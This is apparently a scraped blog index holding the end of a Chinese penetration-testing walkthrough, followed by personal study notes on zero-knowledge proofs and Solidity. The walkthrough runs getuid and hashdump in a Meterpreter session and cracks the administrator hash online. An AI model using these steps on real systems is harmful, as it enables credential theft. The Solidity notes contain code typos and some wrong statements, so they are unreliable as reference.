session 1run\n\n\n检查权限：\n1getuid\n\n\n\n\n发现已经是最高权限\n\n10. 持久化攻击\n获取 administrator 密码：\n使用 hashdump 模块提取密码 hash。\n已经可以看到相关账户密码加密后的hash了 \n\n\n将 hash 上传至 cmd5.com 进行解密，得到密码为 admin123。\n\n\n\n","url":"2024/11/06/penetration_testing_steps/","date":"2024-11-06"},{"title":"ZKP","content":"计算复杂度理论P问题： 可以在多项式时间内求解\nNP问题：不可以在多项式时间（可能需要指数或亚指数时间）计算求解；\n​\t\t\t\t但是可以验证解的正确性。\n零知识证明 系统是基于NP问题空间来构建的\n什么是IPA\n什么是plonk\n\n\n\n\n\n\neg: circom语言\n\n\nw1是私用输入\n","url":"2025/04/18/ZKP/","date":"2025-04-18"},{"title":"solidity基础001","content":"关键词：变量 数值类型 函数 数组 印射仅个人学习使用（WTF学习笔记）\n数值类型初始值bytes1 是固定大小的字节类型，表示一个 1 字节的值（8 位）。它的初始值（默认值）是 0x00，即所有位都为 0。\n具体解释：\n\n在 Solidity 中，任何未赋值的变量都会有一个默认值。对于 bytes1 类型，它的默认值是一个长度为 1 字节的值，所有的位都被初始化为 0，用十六进制表示为 0x00。\n如果用二进制表示，它是 00000000。\n\n值类型初始值\n\nboolean: false\n\nstring: “”\n\nint: 0\n\nuint: 0\n\nenum: 枚举中的第一个元素\n\naddress: 0x0000000000000000000000000000000000000000 (或 address(0))\n\nfunction\n\n\ninternal: 空白函数\nexternal: 空白函数\n\n\n\n引用类型初始值\n\n映射mapping: 所有元素都为其默认值的mapping\n\n结构体struct: 所有成员设为其默认值的结构体\n\n数组array\n\n\n动态数组: []\n静态数组（定长）: 所有成员设为其默认值的静态数组\n\n\n\nBytes4 类型表示的是一个固定长度的字节数组，长度为 4 个字节。每个字节由 2 个十六进制字符表示，因此：• 1 字节 &#x3D; 2 个十六进制字符• 4 字节 &#x3D; 4 × 2 &#x3D; 8 个十六进制字符因此，bytes4类型具有 8 个十六进制位。示例：例如，一个 bytes4 类型的值可能是 0x12345678，这里的 12345678 就是 8 个十六进制字符。\n函数声明可见性说明符pure|view|payable函数输出123function returnMultiple() public pure returns(uint256, bool, uint256[3] memory) &#123;   return (1, true, [uint256(1), 2, 5]);&#125;\n\n此处memory是什么？  是用于指定数据存储位置的关键字。它标识的是数据在内存中存储，而不是在区块链上永久存储，通常用于临时存储复杂数据类型（如数组或结构体）并在函数执行期间操作它们，执行完毕后释放资源。具体来说，memory 指定了在函数执行期间，数据只临时存储在内存中，一旦函数执行完毕，内存中的数据就会被释放。  例如此处：uint256[3] memory 中的 memory 指定了数组 [uint256(1), 2, 5] 将在内存中临时存储，而不是在区块链的持久存储（即 storage）中存储。\n  此处代码解析：\n\nuint256[3] memory: 定义了一个长度为 3 的 uint256 类型数组，并将其存储在内存中。\n[unit256(1),2,5]:• uint256(1)：这个表示法将 1 明确地转换为 uint256 类型。在某些情况下Solidity 可能会自动推断出整数类型为 uint256，但是为了确保类型一致性，可以使用这种显式类型转换。• 2 和 5：这两个值直接写为整数，Solidity会自动将它们识别为 uint256 类型，因它们是未指定类型的字面常量，且默认情况下 Solidity 会将整数推断为 uint256。\n\n变量数据存储和作用域：1. 声明类型1.1 Solidity数据存储位置有三类：storage，memory和calldata。\n\n[1]\n数据存储类型介绍\n（1）Storage（存储） \n该存储位置存储永久数据，这意味着该数据可以被合约中的所有函数访问。可以把它视为计算机的硬盘数据，所有数据都永久存储。保存在存储区(Storage)中的变量，以智能合约的状态存储，并且在函数调用之间保持持久性。与其他数据位置相比，存储区数据位置的成本较高。\n（2） Memor y（内存） \n内存位置是临时数据，比存储位置便宜。它只能在函数中访问。通常，内存数据用于保存临时变量，以便在函数执行期间进行计算。一旦函数执行完毕，它的内容就会被丢弃。你可以把它想象成每个单独函数的内存(RAM)。\n（3）Calldata\nCalldata是不可修改的非持久性数据位置，所有传递给函数的值，都存储在这里。此外，Calldata是外部函数的参数（而不是返回参数）的默认位置。\n存储规则\n【2】\n【3】\n【4】\n【5】\n1.2 赋值和引用1.3常数 constant和immutable只有数值变量可以声明constant和immutable；string和bytes可以声明为constant，但不能为immutable\n\nconstant变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过\nimmutable变量可以在声明时或构造函数中初始化\nimmutable变量既在声明时初始化，又在constructor中初始化，会使用constructor初始化的值。\n\n2. 作用域2.12.22.3全局变量2.3.1以太单位&amp;时间单位2.4引用类型2.4.1数组分为：固定数组；可变数组；（bytes比较特殊，是数组，但是不用加[]另外，不能用byte[]声明单字节数组，可以使用bytes或bytes1[]。bytes比bytes1[]省gas。\n创建数组的规则对于memory修饰的动态数组，可以用new操作符号来创建，但是必须声明长度，并且声明后长度不能改变。\neg：\n123// memory动态数组uint[] memory array8 = new uint[](5);bytes memory array9 = new bytes(9);\n如果创建的是动态数组，需要一个一个元素的赋值。\n数组成员\n\nlength: 数组有一个包含元素数量的length成员，memory数组的长度在创建后是固定的。\npush(): 动态数组拥有push()成员，可以在数组最后添加一个0元素，并返回该元素的引用。\npush(x): 动态数组拥有push(x)成员，可以在数组最后添加一个x元素。\npop(): 动态数组拥有**pop()**成员，可以移除数组最后一个元素（与数据结构的栈相同）\n\n2.4.2结构体创建结构体：\n1234567//结构体struct Student&#123;uint256 id;uint256 score;&#125;Student student;//初始化一个student结构体\n\n结构体赋值方法\n方法1:在函数中创建一个storage的struct引用\n12345function initStudent1() external&#123;\tStudent storage _student = student;\t_stdent.id = 11;\t_student.score = 100;&#125;\n\nstorage\n方法2:直接引用状态变量的struct\n1234function initStudent2() external&#123;\tstudent.id = 11;\tstundet.score = 100;&#125;\n\n\n\n方法3:构造函数式\n123function initStudent3() external&#123;student = Student(11,100);&#125;\n\n\n\n方法4:key value\n123function initStudent4() external&#123;\tstudent = Student(&#123;id: 11,score: 100&#125;);&#125;\n\n\n\n2.4.3印射 （mapping)定义： Solidity中存储键值对的数据结构，可以理解为哈希表\nmapping变量不存长度信息\n在映射中，人们可以通过键（Key）来查询对应的值（Value）\n比如：通过一个人的id来查询他的钱包地址。\n格式为\n1mapping(_KeyType =&gt; _ValueType)\n\n其中_KeyType和_ValueType分别是Key和Value的变量类型\n例子：\n12mapping(uint =&gt; address) public idToAddress; // id映射到地址mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址\n\n\n\n映射的规则规则1\n映射的_keytype只能选择solidity内置的值类型，比如uint,address等，不能用自定义的结构体，而_Valuetype可以使用自定义的类型（例如：结构体）。\n规则2\n映射的存储位置必须是storage，因此可以用于合约的状态变量，函数中的storage变量和library函数的参数（例子）。不能用于public函数的参数或返回结果中，因为mapping记录的是一种关系（key-value pair)。\n规则3\n如果映射声明为 public，那么Solidity会自动给你创建一个 getter 函数，可以通过 key 来查询对应的 value 。规则4\n给映射新增的键值对的语法为_var[_Key]&#x3D; _value，其中 _var 是映射变量名，_Key 和_value 对应新增的键值对。\neg: \n123function writeMap(uint key,address Value)public&#123;\tidToAddress[ Key]= Value;&#125;\n\n\n\n\n\n\n题：1.请解释下面这段代码的意思：\n12address payable addr;addr.transfer(1);\n选择一个答案A. 调用者向合约转账1weiB. 调用者向addr转账1weiC. 合约向addr转账1weiD. 合约向addr转账1ether\n解析：\n\naddress payable: 这是一个 payable 地址类型，表示这个地址能够接收以太币（ether）转账。只有 payable 地址才允许进行 transfer() 或 send() 操作。\naddr.transfer(1): 这是一个转账操作，向地址 addr 转账 1 单位的以太币，单位是 wei。在以太坊中，最小的货币单位是 wei，而 1 ether &#x3D; 10^18 wei。因此，这里转账的数额是 1 wei，而不是 1 ether。\ntransfer操作是合约向addr转账。正确答案选c\n\n2.以下关于数组的说法中，正确的是(选择一个答案)\n A. 固定长度数组和bytes拥有push()成员，可以在数组最后添加一个0元素。\n B. 数组字面常数，例如[uint(1),2,3]，需要声明第一个元素的类型，不然默认用存储空间最大的类型\n C. 内存数组的长度在创建后是固定的。 \n D. 对于memory可变长度数组，可以用new操作符来创建，并且不用声明长度，例如uint[] \n解析：\n\nA. 固定长度数组和 bytes 拥有 push() 成员，可以在数组最后添加一个0元素。 这句话是错误的。固定长度数组没有 push() 成员，只有 可变长度数组     才有 push() 成员，而 bytes 是可变长度数组，因此 bytes 可以使用 push()，但固定长度数组不能。\n\n选项 B 的说法 不正确。原因：在 Solidity 中，数组字面常量的类型推断并不会自动默认为存储空间最大的类型。类型推断基于数组字面量中的元素值：对于一个字面量数组，如 [1, 2, 3]，Solidity 会推断这些数字为最小的适当类型。例如，在这种情况下，uint8 就足够了，因为所有数字都能用 8 位来表示，而不会默认推断为 uint256。只有在数组的元素中存在更大范围的数值时，编译器才会选择相应的更大类型。如果你希望指定一个更大的类型（比如 uint256），需要显式地声明。因此，数组字面常量中的类型并不会默认使用存储空间最大的类型，而是基于实际的数值大小来推断最适合的类型。\n示例：\n[1, 2, 3] 会推断为 uint8。\n[uint256(1), 2, 3] 才会显式地使用 uint256 进行类型推断。\n\n\n所以，B 选项的说法是 不正确的。\n\nC. 内存数组的长度在创建后是固定的。\n\nD. 这句话是错误的。使用 new 操作符创建内存数组时，必须指定数组的长度，不能省略长度声明。正确的用法是\n1uint[] memory array = new uint[](length);\n\n3.以下关于结构体的说法中，错误的是\n选择一个答案\nA. 通过结构体的形式可以定义新的类型。\nB. 结构体内可以包含字符串，整型等基本数据类型，也可以包含数组，映射，结构体等复杂类型。\nC. 结构体内可以包含其本身。\n解析：\n\nA. 这是正确的。结构体在 Solidity 中用于定义新的自定义类型，允许开发者创建更复杂的数据结构。\nB. 这是正确的。结构体可以包含基本数据类型（如 uint、string），也可以包含复杂类型（如数组、映射、其他结构体）。\nC.  这是错误的。在 Solidity 中，结构体不能直接包含其本身，因为这会导致无限嵌套，无法确定内存的大小。不过，结构体可以包含指向其他结构体的     引用，例如使用指针或映射的方式来实现递归关系。\n\n因此，选项 C 是错误的。\n4. 在如下的合约中，我们定义了四个 immutable 的变量 y1, y2, y3, y4。\n 123456789101112131415161718 uint256 immutable y1; address immutable y2; address immutable y3; uint256 immutable y4; constructor (uint256 _y4)&#123; y1 = block.number; y2 = address(this);y3 = msg.sender;y4 = _y4; &#125; \n\n其中，确实有必要在构造函数 constructor 中才赋值的一项是： \nA. y1 B. y2 C. y3 D. y4\n解析：\n\ny4 是通过构造函数参数 _y4 传入的值，因此只有在部署合约时才能确定它的值，这使得它必须在构造函数中赋值。\n\n其他变量在构造函数外也可以直接赋值，或者它们的值是在合约部署时自动确定的：\n\ny1：可以在合约外直接赋值为 block.number，表示合约部署时的区块号。\ny2：可以直接设置为 address(this)，即合约自身的地址，在合约部署时自动确定。\ny3：可以直接设置为 msg.sender，即部署合约的地址，也是在合约部署时自动确定的。\n\n因此，只有 y4 是依赖于构造函数参数，必须在构造函数中进行赋值。选D。\n5.下面定义变量的语句中，会报错的一项是： \nA. string constant x5 &#x3D; “hello world”; \nB. address constant x6 &#x3D; address(0); \nC. string immutable x7 &#x3D; “hello world”; \nD. address immutable x8 &#x3D; address(0);\n解析：\n\n在 Solidity 中，immutable 变量必须在 构造函数中 赋值，而不能在声明时直接赋值。\n\n具体说明：\n\n**A. string constant x5 &#x3D; “hello world”;**：constant 变量必须在声明时赋值，因此这是正确的。\n**B. address constant x6 &#x3D; address(0);**：constant 变量在声明时赋值是正确的。\n**C. string immutable x7 &#x3D; “hello     world”;**：这是错误的，因为 immutable 变量不能在声明时赋值，必须在构造函数中进行赋值。\n**D. address immutable x8 &#x3D; address(0);**：虽然是 immutable 变量，但它的赋值可以在构造函数中完成，定义时不能直接赋值。此处代码如果在构造函数中赋值是正确的。\n\n因此，选项 C 会报错。\n ps\n123456//命名式返回function returnNamed() public pure returns(uint256_number, bool _bool, uint256[3] memory _array)(_number = 2;_bool = false;_array = [uint256(3),2,1];&#125;\n命名式返回，依然支持return\n1234Function returnNamed2() public pure returns(uint256 _number,bool _bool,unit256[3] memory _arrray)&#123; return(1,true,[unit256(1),2,5]); &#125;\n\n\n\n\n_array 被赋值为 [uint256(3), 2, 1]。这表示它是一个包含三个元素的数组，其中：• 第一个元素是 3（明确类型转换为 uint256）。• 第二个元素是 2（自动推断为 uint256）。• 第三个元素是 1（自动推断为 uint256）。\n\nSolidity中不存在小数点，以0代替为小数点，举例在Solidity 中，确实没有内置的浮点数（即小数点），因此所有数字必须使用整数类型来表示。这就需要通过一些技巧来模拟小数点，通常是通过将小数值放大为整数来进行计算。例如，如果要表示金额，可以假设整数中的最低位是 “小数点后的一位” 或更多位，这样就能间接表示小数。例子：假设我们想在 Solidity 中表示货币金额，而没有浮点数。我们可以使用整数表示金额，并通过约定整数的最后几位代表小数部分。常见的方法是将金额放大 10^18（即使用以太坊中的 wei 单位），将以太作为以太坊中的基本单位。举例 1: 表示金额假设要表示 1.5 个以太币。\n1uint256 public amount = 1.5 * 10**18; // 1.5 Ether 等于 1.5 * 10^18 wei\n• 在这里，我们使用 10^18 来表示一个以太币，因为1 ether &#x3D; 10^18 wei。为了表示 1.5 个以太币，我们将 1.5 乘以 10^18，最终得到 1500000000000000000 wei。• 尽管 Solidity 不支持浮点数，但我们通过使用整数和固定的精度来实现。举例 2: 模拟小数点计算假设我们有一个代币，代币的精度是小数点后 2 位。我们可以通过放大 100 倍来处理小数点。\n1uint256 public pricePerToken = 150; // 实际上表示 1.50 单位（放大了100倍）\n我们可以通过数学计算来恢复小数点后的值\n12uint256 price = pricePerToken / 100;      // 还原整数部分uint256 decimals = pricePerToken % 100;   // 取出小数部分\n这样 150 就表示 1.50，即使用整数的 150 来代表 1.50。举例 3: 更高精度如果需要更多的精度，比如小数点后 6 位，可以通过乘以 10^6 来处理。\n12uint256 public value = 1234567; // 实际表示 1.234567总结\n在 Solidity 中，通过使用整数来表示带有小数点的值，可以避免精度问题。具体方法是根据需要的精度将小数部分转化为整数进行计算，并在使用时再将其缩放回实际数值。例如，通过乘以 10^18 或 10^6 来模拟 18 位或 6 位的小数。\n\nWei &#x3D; 1\n\nGwei &#x3D; 1e9 &#x3D; 1000000000\n\nether &#x3D; 1e18 &#x3D; 100000000000000000\n\n\n","url":"2024/11/07/solidity基础（1）/","date":"2024-11-07"},{"title":"solidity基础002","content":"关键词：constructor&amp;Modifier  event 继承 接口 异常 重载 库合约 引用 回调\n构造函数constructor和修饰器Modifierconstructor  定义：是一种特殊函数 每个合约可以定义一个，并且在部署合约时自动运行一次。\n可用于初始化合约参数：\n123456789101112131415161718// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MyToken &#123;    string public name;    string public symbol;    uint256 public totalSupply;    address public owner;    //带参数的构造函数用于初始化状态变量    constructor(string memory _name, string memory _symbol, uint256 _initialSupply) &#123;        name = _name;            // Token name        symbol = _symbol;        // Token symbol        totalSupply = _initialSupply;  // 设置初始代币供应量        owner = msg.sender;      // 将部署者设置为合约的拥有者owner    &#125;&#125;\n\n\n\nModifier定义：类似于decorator，声明函数拥有的特性，并减少代码冗余\n主要使用场景： 运行函数前的检查，例如地址，变量，余额等。\n定义一个叫做onlyOwner的modifier：\n12345//定义modifiermodifier onlyOwner&#123;  require(msg.sender == owner);//检查调用者是否为owner地址  _;// 如果是的话，继续运行函数主体；否则报错并revert交易&#125;\n\n\n\n带有onlyOwner修饰符的函数只能被owner地址调用\neg:\n1234//改变ownerfunction changeOwner(address_newOwner) external onlyOwner&#123;  owner = _newOwner;// 只能owner地址运行这个函数，并改变owner&#125;\n\n​\t在以上函数中，由于onlyOwner修饰符的存在，只有原先的owner可以调用，别人调用就会报错。这也是最常用的控制智能合约权限的方法。\n事件event\n特点\n\n\n响应： 应用程序（ether.js)可以通过RPC接口订阅和监听这些事件，并在前端做响应。\n经济：事件是EVM上比较经济的存储数据的方式，每个大概消耗2,000 gas；相比之下，链上存储一个新变量至少需要20,000 gas。\n\n\n作用\n日志记录：事件在链上作为日志记录保存，不能被智能合约读取，但可供外部观察。\n通知机制：前端应用、DApp 等可以监听事件来响应合约的变化，如更新用户余额、确认交易等。\n优化 Gas 消耗：事件的存储成本低于状态变量的修改，因此在某些应用场景下，使用事件记录是更高效的选择。\n\n\n声明事件\n\n1Event + 事件名称 + (变量类型 变量名,变量类型 变量名,...)\n\n\n\n​\t以REC20代币合约的Transfer事件为例：\n12345event Transfer(address indexed from,address indexed to,uint256 value);//from:转账地址//to:接收地址//value:转账数量//其中from&amp;to前面带有indexed关键字，他们会保存在以太坊虚拟机日志的topics中，方便之后检索\n\n\n\n\n释放事件\n\n释放事件（Emit Event）是指在区块链上发布特定事件通知的操作。\n通过释放事件，合约可以在发生某些操作（如状态改变、资金转移等）时，向链上日志系统发送记录。\n事件通常用于通知外部应用程序，如前端应用或监听工具，便于监控合约状态的变化\n关键字\n1Emit\n\neg:\n12345678910111213141516//定义_transfer函数，执行转账逻辑function_tranfer(\taddress from,\taddress to;\tuint256 amount)external&#123;    _balance[from] = 10000000;//给转账地址一些初始代币    _balances[from] -=  amount; // from地址减去转账数量    _balances[to] += amount; // to地址加上转账数量            //释放事件    emit Transfer(from,to,amount);&#125;\n\n\n\n\nEVM日志\n\n​     EVM用日志log来存储solidity事件，每条日志记录包括主题topics和数据data两部分\n​\t5.1 主题topics（？)\n​\t\t用于描述事件，长度不能超过4。它的第一个元素是事件的签名（哈希）\n​     eg: 例如对于上面的transfer事件，它的事件哈希：\n123keccak256(&quot;Transfer(address,address,unit256)&quot;)//0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n\n\n\n​\t\t除了事件哈希，主题还可以包含至多3个indexed参数，也就是Transfer事件中的from和to。\n​    5.2 数据data\n​\t\t\t事件中不带 indexed的参数会被存储在 data 部分中，可以理解为事件的“值”。data 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 data 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的 topics 部分中，也是以哈希的方式存储。另外，data 部分的变量在存储上消耗的gas相比于 topics 更少。\n​\t5.3 在Etherscan上查询事件\n当尝试用**_transfer()函数在Sepolia测试网络上转账100代币，可以在Etherscan上查询到相应的tx**：网址。\n​\t点击Logs按钮，就能看到事件明细\n​\tTopics里面有三个元素，[0]是这个事件的哈希，[1]和[2]是我们定义的两个indexed变量的信息，即转账的转出地址和接收地址。Data里面是剩下的不带indexed的变量，也就是转账数量。\n继承\n规则\n\n1.1  virtual\n​\t父合约中的函数，如果希望子合约重写，需要加上virtual关键字。\n1.2 override：\n​\t子合约重写了父合约中的函数，需要加上override关键字。\n注意：用override修饰public变量，会重写与变量同名的getter函数\n\n简单继承\n\n​\t先写一个简单的A合约\n​\t再定义一个B合约，让他继承A合约\n1contract B is A\n\n\n\n\n多重继承\n\n​\t\t规则：\n\n继承时要按辈分最高到最低的顺序排。\neg:比如我们写一个Erzi合约，继承Yeye合约和Baba合约，那么就要写成\n1contract Erzi is Yeye, Baba\n\n而不能写成contract Erzi is Baba, Yeye，不然就会报错。\n\n如果某一个函数在多个继承的合约里都存在，在子合约里必须重写，不然会报错\n\n重写在多个父合约中都重名的函数时，override关键字后面要加上所有父合约名字\n\n\n1override(Yeye, Baba)\n\n4. 修饰器的继承​\t\t用法与函数继承类似，在相应的地方加virtual和override关键字即可。\n5. 构造函数的继承​\t子合约有两种方法继承父合约的构造函数:\n1. **在继承时声明父构造函数的参数**\n\neg:\n1contract B is A(1)\n\n\n在子合约的构造函数中声明构造函数的参数\n\neg:\n123contract C is A &#123;    constructor(uint _c) A(_c * _c) &#123; &#125;&#125;\n\n\n\n\n调用父合约的继承\n\n​\t子合约有两种方式调用父合约的函数：\n\n直接调用\n\n​\t\t子合约直接用父合约名.函数名（）的方式来调用父合约函数\neg: Yeye.pop()\n123function callParent() public&#123;\t\tYeye.pop();&#125;\n\n\n\n\nSuper关键字\n\n​\t子合约可以利用**super.函数名()**来调用最近的父合约函数。\neg:\n​\t当Solidity继承关系按声明时从右到左的顺序是：contract Erzi is Yeye, Baba，那么Baba是最近的父合约，super.pop()将调用Baba.pop()而不是Yeye.pop()\n1234function callParentSuper() public&#123;\tsuper.pop();\t//此处调用的是Baba.pop()&#125;\n\n\n\n\n钻石继承\n\n​\t指一个派生类同时有两个或两个以上的基类。\n1234567/*\tyeye\t/  \\baba\tmama\t\\  /\t me*/\n\n\n\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152contract Yeye&#123;\tevent Log(string message);\t\tfunction foo() public virtual&#123;\t\temit Log(&quot;Yeye.foo called&quot;);\t&#125;\tfunction bar() public virtual&#123;\t\temit Log(&quot;Yeye.foo called&quot;);\t&#125;&#125;//baba继承yeyecontract Baba is Yeye&#123;\tfunction foo() public virtual override&#123;\t\temit Log(&quot;Baba.foo called&quot;);\t\tsuper.foo();\t&#125; \t\tfunction bar() public virtual override&#123;\t\temit Log(&quot;Eve.bar called&quot;);\t\tsuper.bar();\t&#125;\t//mama继承yeyecontract Mama is Yeye&#123;\tfunction foo() public virtual override&#123;\t\temit Log(&quot;Baba.foo called&quot;);\t\tsuper.foo();\t&#125; \t\tfunction bar() public virtual override&#123;\t\temit Log(&quot;Mama.bar called&quot;);\t\tsuper.bar();\t&#125;\t\t//me继承mama babacontract me is Baba,mama&#123;\tfunction foo() public override(Baba,Mama)&#123;\t\tsuper.foo();\t&#125;\t\tfunction bar() public override(Baba,Mama)&#123;\t\tsuper.bar();\t\t//此处Super.bar会依次调用baba,mama最后是god合约\t&#125;&#125;\t&#125;\n\n(当然现实辈分关系具体不是这样，只是代指三个层次)\n所谓钻石，即虽然Baba,Mama都是Yeye的子合约，但整个过程中，God合约只会被调用一次\n(因为solidity强制一个由基类构成的DAG（有向无环图）使其保证一个特定的顺序)\n抽象合约​\t如果一个智能合约里至少有一个未实现的函数，即某个函数缺少主体**{}中的内容，则必须将该合约标为abstract**，不然编译会报错。\n未实现的函数需要加virtual，以便子合约重写。拿插入排序合约为例，如果我们还没想好具体怎么实现插入排序函数，那么可以把合约标为abstract，之后让别人补写上。\n123456789101112131415161718192021constract Sort&#123;abstract constract Insertsort&#123;\tfunction insertionSort(uint[] memory a)public pure virtual returns(uint[] memory)&#123;\t/*for(uint i = 0; i &lt; a.length;i++)&#123;\tuint temp = a[i];\tuint j = i;\twhile(j &gt; 0 &amp;&amp; temp &lt;a[j - 1])&#123;\t\ta[j] = a[j - 1];\t\tj--;\t\t\t&#125;\t\t\ta[j] = temp;\t\t&#125;\t\treturn 0;\t\t*/\t&#125;&#125;&#125;/*Solidity中最常用的变量类型是uint，也就是正整数，取到负值的话，会报underflow错误。而在插入算法中，变量j有可能会取到-1，引起报错。这里，我们需要把j加1，让它无法取到负值。*/\n\n\n\n\n\n接口（interface）规则：\n1. 接口不能包含状态变量\n1. 不能包含构造函数\n1. 不能继承除接口外的其他合约\n1. 所有函数都必须是external且不能有函数体\n1. 继承接口的非抽象合约必须实现接口定义的所有功能\n\n接口提供了两个重要的信息：\n\n合约里每个函数的bytes4选择器，以及函数签名函数名(每个参数类型）。\n接口id（更多信息见EIP165）\n\n另外，接口与合约ABI（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的ABI，利用abi-to-sol工具，也可以将ABI json文件转换为接口sol文件。\n接口和常规合约的区别在于每个函数都以;代替函数体{ }结尾。\n什么时候使用接口：\n我们不需要知道它的源代码，只需知道它的合约地址，用对应的接口就可以与它交互。都可以写模版并且减少代码冗余。\n三种抛出异常1. error​\t可以在contract之外定义异常。\nEg : 我们定义一个TransferNotOwner异常，当用户不是代币owner的时候尝试转账，会抛出错误：\n1error TransferNotOwner(); *//* *自定义error*\n\n\n\n我们也可以定义一个携带参数的异常，来提示尝试转账的账户地址\n1error TransferNotOwner(address sender); // 自定义的带参数的error\n\n在执行当中，error必须搭配revert（回退）命令使用\n2. Require​\t\t它很好用，唯一的缺点就是gas随着描述异常的字符串长度增加，比error命令要高\n使用方法：\n1require(检查条件，“异常的描述”)\n\n​\t当检查条件不成立的时候，就会抛出异常\n3. Assert比require少个字符串，即不能抛出异常的原因\nassert命令一般用于程序员写程序debug，它的用法很简单\n1assert(检查条件）\n\n当检查条件不成立的时候，就会抛出异常。\n三种方法的gas比较error方法gas最少，其次是assert，require方法消耗gas最多\n因此，error既可以告知用户抛出异常的原因，又能省gas要多用！\n函数重载实参匹配：调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。\n 如果出现多个匹配的重载函数，则会报错\noverloading:即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。\nsolidity不允许修饰器（modifier）重载\n库合约​\t库合约是一系列的函数合集，用于提升solidity代码的复用性和减少gas而存在\n​\t他和普通合约主要有以下几点不同：\n\n不能存在状态变量\n不能够继承或被继承\n不能接收以太币\n不可以被销毁\n\n​\t库合约中的函数可见性如果被设置为public或者external，则在调用函数时会触发一次delegatecall。而如果被设置为internal，则不会引起。对于设置为private可见性的函数来说，其仅能在库合约中可见，在其他合约中不可用。\ndelegatecall: \ndelegatecall 是一种特殊的低级函数调用，用于将当前合约的上下文（包括msg.sender和msg.value等）传递给另一个合约的函数执行。delegatecall 允许合约在不改变调用者上下文的情况下执行另一个合约的代码。\ndelegatecall 的作用\n\n共享存储：delegatecall 是调用另一个合约的代码，并在调用者合约的存储上下文中执行。这意味着被调用合约的代码会对调用合约的存储变量进行读写。\n保持调用者上下文：msg.sender 和 msg.value 等上下文信息保持不变，依旧指向调用者，这和普通的合约调用不同。\n代码重用：使用 delegatecall 可以使多个合约共享同一段逻辑代码，通过代理模式实现合约的代码复用。\n\nStrings库合约Strings库合约是将uint256类型转换为相应的string类型的代码库\n如何利用：\n​\t用using for 指令\n1using A for B\n\n\n\n​\t用于附加库合约（从库A）到任何类型（B)。添加完指令后，库A中的函数会自动添加为B类型变量的成员，可以直接调用。\n注意： 在调用的时候，这个变量会被当作第一个参数传递给函数\n直接通过库合约名称调用函数\n123456789//利用using for指令using String for uint256;function getString1(uint256_number)public pure returns(string memory)&#123;\t\t//库合约中的函数会自动添加为uint256型变量的成员\t\treturn _number.toHexString();&#125;\n\n\n\n常用库合约：\nStrings：将**uint256**转换为**String**\nAddress：判断某个地址是否为合约地址\nCreate2：更安全的使用**Create2 EVM opcode**\nArrays：跟数组相关的库合约\n引用Import​\t引用（import）在代码中的位置为： 在声明版本号之后，在其余代码之前\n​\timport语句可以帮助我们在一个文件中引用另一个文件的内容\n用法\n通过源文件相对位置导入\n\n12//通过文件相对位置importimport &#x27;./name.sol&#x27;\n\n\n通过源文件网址导入网上的合约的全局符号\n\n12//通过网址引用import&#x27;url&#x27;\n\n\n通过npm的目录导入\n\n通过指定全局符号导入合约特定的全局符号\n\n\n1import &#123;name&#125; from&#x27;./name.sol&#x27;\n\n​\t其中的 name 就是一个 全局符号。它可以是一个具体的合约、库、结构体、枚举或函数的名称。通过 import 语句，可以从指定的文件（例如 name.sol）中导入该符号，以便在当前文件中直接使用。\n回调函数receive&amp;fallback作用1. 接受ETH\n1. 处理合约中不存在的函数调用（代理合约proxy contract）\n\n（所以：fallback 和 receive 函数无法在合约内部直接调用。这些特殊函数只能通过外部调用触发，通常在接收以太币或处理未知的函数调用时自动执行\n接收ETH函数receivea. 在合约收到ETH转账时被调用\nb. 一个合约最多有一个receive()函数\nc. 声明方式: \n1receive() external payable &#123; ... &#125; [不需要function关键字]\n\nd.  receive()函数不能有任何的参数，不能返回任何值，必须包含external和payable\nreceive()最好不要执行太多的逻辑，receive()太复杂可能会触发Out of Gas报错\n回退函数fallbacka.   在调用合约不存在的函数时被触发\nb.   可用于接收ETH，也可以用于代理合约proxy contract\nc.   声明时不需要function关键字，必须由external修饰，一般也会用payable修饰\nEg: 用于接收ETH:\n1fallback() external payable &#123; ... &#125;\n\n\n\n二者区别\n合约接收ETH时，msg.data为空且存在Receive()时，会触发receive()；msg.data不为空或不存在receive()时，会触发fallback()，此时fallback()必须为payable\n\nreceive()和payable fallback()均不存在的时候，向合约直接发送ETH将会报错\n（你仍可以通过带有payable的函数向合约发送ETH）\n\n\n\t\n​\t在这个场景中，vitalik 向合约 ReceiveETH 发起了一笔带有 msg.data（0xaa）的低级交互，同时设置了 value 为 100 Wei。让我们分析代码：\n\n合约 ReceiveETH 中定义了一个 receive() 函数，该函数是 external 和 payable 的，但 receive() 函数只能在没有 msg.data 的情况下被调用。\n由于 msg.data 不为空（0xaa），这次调用不会触发 receive() 函数。\n合约也没有定义 fallback 函数，所以任何带有 msg.data 且没有匹配函数签名的调用将会导致交易失败。\n\n结论\n这次调用将失败，并抛出错误，因为合约没有 fallback 函数来处理包含 msg.data 的调用。\n所以会出现报错：error:’Fallback’ function is not defined, value和msg.data均发送失败\n发送ETH\ntransfer()\n\nsend()\n\ncall()，其中call()是被鼓励的用法。\n\n\n首先构造发送ETH合约SendETH，并在其中实现payable的构造函数和receive()\n1234567contract SendETH&#123;\t//构造函数，payable使得部署的时候可以转eth进去    constructor() payable&#123;&#125;    //receive方法 接受eth时被触发    receive() external payable&#123;&#125;&#125;\n\n\n\n1. transfer1接收方地址.transfer(发送eth的数额)\n\n·    transfer()的gas限制是2300，足够用于转账，但对方合约的**fallback()或receive()**函数不能实现太复杂的逻辑。\n·    transfer()如果转账失败（eg: amount&gt;value），会自动revert（回滚交易）。\n amount：通常表示用户或合约希望发送的 ETH 的数量。这里 amount 是一个变量，表示转账时指定的具体金额（单位为 wei）。\nvalue：指交易中随附的 ETH 数量，通常由 msg.value 表示。这是调用合约时由发送方附加的 ETH 数量，通常用于支付给其他地址或完成购买。value 只能在 payable 函数中被使用。\n1234//用transfer()发送ETH,_to填reveive合约地址，amount填ETH转账金额function transferETH(address payable _to,uint256 amount) external payable&#123;\t_to.transfer(amount);&#125;\n\n\n\n2. send用法\n1接收方地址.send(发送ETH数额)\n\n·    